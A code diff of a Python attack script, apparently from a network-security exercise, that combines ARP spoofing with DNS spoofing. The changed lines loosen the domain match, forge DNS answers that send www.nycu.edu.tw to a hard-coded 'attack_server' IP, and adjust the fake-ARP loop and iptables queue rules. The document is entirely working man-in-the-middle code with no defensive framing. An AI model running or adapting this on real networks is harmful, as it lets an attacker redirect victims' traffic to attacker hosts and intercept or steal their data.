@@ -65,14 +65,13 @@ def send_fake_arp():
 
 
 
-target_domain = 'www.nycu.edu.tw.'
+target_domain = 'www.nycu.edu.tw'
 attack_server = '140.113.207.237'
 
 def callback(pkt):
 	spkt = IP(pkt.get_payload())
 
-	if spkt[DNSQR].qname == target_domain.encode('ascii'):
-		
+	if target_domain.encode('ascii') in spkt[DNSQR].qname:
 		response = DNSRR(rrname = target_domain, rdata = attack_server)
 		
 		spkt[DNS].an = response
@@ -114,7 +113,7 @@ def main():
 	while True:
 		try:
 			send_fake_arp()
-			time.sleep(5)
+			time.sleep(10)
 		except KeyboardInterrupt:
 			system('iptables -D FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
 			system('iptables -D FORWARD -j REJECT -p tcp --sport 53')
